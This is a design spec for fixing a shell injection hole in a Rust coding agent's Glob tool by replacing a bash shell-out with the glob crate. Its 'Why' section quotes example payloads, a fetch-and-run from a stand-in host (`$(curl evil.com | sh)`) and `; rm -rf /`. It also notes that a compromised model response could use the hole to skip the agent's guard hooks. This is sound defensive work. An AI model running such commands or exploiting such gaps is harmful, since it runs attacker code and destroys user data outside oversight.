---
status: Complete
created: 2026-03-11
---

# Replace Shell Injection in Glob Tool

**Target:** Eliminate shell injection vulnerability in `glob_exec` by replacing bash shell-out with the `glob` Rust crate

---

## Why

`glob_exec` in `src/tools/mod.rs` interpolates user-supplied patterns directly into a bash command string:

```rust
let output = Command::new("bash")
    .arg("-c")
    .arg(format!(
        "shopt -s globstar nullglob; files=({full_pattern}); printf '%s\\n' \"${{files[@]}}\" | head -1000"
    ))
```

The `pattern` parameter comes from the LLM's tool_use response. A malicious or compromised model response could inject arbitrary shell commands via the pattern, e.g., `$(curl evil.com | sh)` or `; rm -rf /`. The command executes under `bash -c` with no sanitization.

This is worse than it looks because `Glob` is classified as `ToolEffect::Pure`, meaning guard hooks skip it entirely. The tool is assumed safe because it should be read-only, but the shell-out makes it a full code execution vector with no guardrails.

The fix is to use Rust's `glob` crate, which does pattern matching in-process with no shell involvement. This eliminates the injection surface entirely rather than trying to sanitize inputs.

---

## Requirements

**R1. Replace Shell-Out with `glob` Crate**
- Add the `glob` crate as a dependency in `Cargo.toml`
- Rewrite `glob_exec` to use `glob::glob()` or `glob::glob_with()` instead of `Command::new("bash")`
- No shell subprocess spawned by the Glob tool under any input

**R2. Preserve Existing Behavior**
- Pattern matching: support `**` (recursive), `*`, `?`, `[...]` character classes
- Base directory: respect the `path` parameter (default `.`) as the search root
- Result format: newline-separated file paths, same as current output
- Result limit: cap at 1000 entries (current `head -1000` behavior)
- Empty results: return `"No files found"` string (current behavior)
- Sorting: current behavior sorts by shell expansion order. The `glob` crate returns results in alphabetical order. This is acceptable — the tool description says "sorted by modification time" but the implementation never sorted by mtime. Do not add mtime sorting; accept glob crate ordering.

**R3. Pattern Construction**
- If the pattern starts with `/` or `.`, use it as-is (absolute or explicit relative)
- Otherwise, prepend the base directory: `format!("{base}/{pattern}")`
- This matches the current path construction logic at lines 192-196

**R4. Error Handling**
- `glob::glob()` returns a `Result<Paths, PatternError>`. Map `PatternError` to an `Err(String)` with a descriptive message including the invalid pattern.
- Individual path results within the iterator are `Result<PathBuf, GlobError>`. Skip entries that fail (permission denied on a directory, etc.) rather than aborting the entire glob. Log nothing — the user sees the successful matches.

**R5. Brace Expansion Pre-Processing**
- The `glob` crate does not support brace expansion (`{a,b,c}`). Bash expands braces before globbing, and the LLM regularly generates patterns like `**/*.{rs,toml}` and `src/{main,lib}.rs`.
- Before calling `glob::glob()`, detect and expand brace groups in the pattern. For each brace group, produce one pattern per alternative and glob each independently, deduplicating and merging results.
- Only handle a single top-level brace group (e.g., `**/*.{rs,toml}`). Nested braces (`{a,{b,c}}`) and multiple brace groups (`{a,b}-{c,d}`) are not worth the complexity — treat them as literal characters.
- Implementation: find `{`, find matching `}`, split contents on `,`, produce expanded patterns. If `{` is found but no matching `}` exists after it, treat the pattern as having no brace group and pass it through unchanged.
- If any expanded pattern produces a `PatternError`, fail the entire operation (return `Err`). Do not return partial results from valid expansions — the original pattern is malformed and partial results would mask the error.
- The 1000-entry result limit (R2) applies to the combined deduplicated results across all expanded patterns, not per-pattern.

---

## Architecture

```text
glob_exec(input)
  │
  ├─ extract pattern, base from input (unchanged)
  ├─ construct full_pattern (unchanged logic)
  │
  ├─ expand_braces(full_pattern) → Vec<String>
  │    ├─ find first '{' and matching '}'
  │    ├─ if '{' found but no matching '}' → vec![full_pattern] (pass through)
  │    ├─ split alternatives on ','
  │    ├─ produce one pattern per alternative (prefix + alt + suffix)
  │    └─ if no braces found → vec![full_pattern]
  │
  ├─ for each expanded pattern:
  │    ├─ glob::glob(&pattern)
  │    │    ├─ Err(PatternError) → return Err("Invalid glob pattern: ...")
  │    │    └─ Ok(paths) →
  │    │         ├─ filter_map: skip Err entries (permission errors)
  │    │         └─ add to results Vec if not in seen HashSet (preserves order)
  │    └─ stop collecting when results.len() >= 1000
  │
  └─ if result empty → "No files found"
     else → newline-joined String
```

Changes to existing code:

1. `Cargo.toml` — Add `glob = "0.3"` to `[dependencies]`
2. `src/tools/mod.rs` — Rewrite `glob_exec` function body. No signature change. No changes to other functions.

---

## Success Criteria

- [ ] `glob_exec` produces no `Command::new("bash")` calls
- [ ] Pattern `**/*.rs` from project root returns Rust source files
- [ ] Pattern `src/*.rs` returns files in src directory
- [ ] Pattern with no matches returns `"No files found"`
- [ ] Result count capped at 1000 entries
- [ ] Invalid pattern (e.g., `[`) returns an error, not a panic
- [ ] Shell metacharacters in pattern (`$(cmd)`, `;rm`, backticks) are treated as literal pattern characters, not executed
- [ ] Pattern `**/*.{rs,toml}` returns both `.rs` and `.toml` files
- [ ] Pattern `src/{main,lib}.rs` returns both files
- [ ] Pattern with `path` parameter (e.g., `pattern: "*.rs"`, `path: "src"`) returns files from the specified directory
- [ ] `ToolEffect::Pure` classification remains correct (the tool IS now genuinely pure)
- [ ] Existing Glob-related tests pass
- [ ] `cargo clippy -- -D warnings` clean

---

## Non-Goals

- Modification time sorting (not implemented currently despite tool description claiming it)
- Hidden file inclusion/exclusion options (follow glob crate defaults)
- Symlink following configuration (follow glob crate defaults)
- Changing the tool's schema, description, or ToolEffect classification
- Adding the `globset` crate (overkill for this use case; `glob` + brace pre-processing is sufficient)
- Nested brace expansion (`{a,{b,c}}`) or multiple brace groups (`{a,b}-{c,d}`) — single top-level group only

---

## Implementation Notes

- The `glob` crate's `glob()` function takes a pattern string and returns an iterator of `Result<PathBuf, GlobError>`. Use `glob::glob()` (not `glob_with()` with `MatchOptions::default()`) — `glob()` uses `MatchOptions::new()` which sets `case_sensitive: true`, matching bash behavior. `Default::default()` sets `case_sensitive: false`, which would be a silent behavioral change on case-sensitive filesystems.
- `glob` supports `**` for recursive matching. The `**` token is handled as a special `AnyRecursiveSequence` that explicitly crosses directory boundaries. No need for bash's `shopt -s globstar`.
- The `glob` crate returns results in alphabetical order (not filesystem/platform-dependent order). This is acceptable and similar to bash's locale-dependent sorted expansion order.
- The `glob` crate handles `nullglob` semantics naturally — an empty iterator means no matches, which maps to the existing `"No files found"` return.
- The `use std::process::Command` import in `tools/mod.rs` is still needed for `bash_exec` and `grep_exec`. Do not remove it.
- This is a security fix. It should be the first item implemented in the next planning cycle.
